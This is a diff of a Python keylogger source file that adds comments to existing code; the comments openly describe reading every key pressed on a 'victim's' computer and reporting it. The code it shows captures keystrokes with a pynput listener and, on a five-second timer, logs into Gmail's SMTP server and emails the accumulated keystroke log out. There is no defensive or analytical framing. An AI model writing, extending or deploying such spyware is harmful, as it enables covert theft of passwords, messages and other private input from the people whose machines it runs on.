@@ -4,6 +4,8 @@ import pynput.keyboard as pk
 import threading
 import smtplib
 
+# Read all buttons witch pressed victim`s computer and report it
+
 
 class Keylogger:
 
@@ -17,6 +19,8 @@ class Keylogger:
     def append_to_log(self, string):
         self.log = self.log + string
 
+# Read pressing
+
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
@@ -29,11 +33,15 @@ class Keylogger:
                 current_key = " (%s) " % key
         self.append_to_log(current_key)
 
+# Report to email
+
     def report(self):
         self.send_mail()
         self.log = ""
         timer = threading.Timer(5, self.report)
         timer.start()
+
+# Init email
 
     def send_mail(self):
         server = smtplib.SMTP("smtp.gmail.com", 587, )
@@ -41,6 +49,8 @@ class Keylogger:
         server.login(self.email, self.password)
         server.sendmail(self.email, self.email, "\n\n"+self.log)
         server.quit()
+
+# Keylogger main function
 
     def start(self):
         keyboard_listener = pk.Listener(on_press=self.process_key_press)
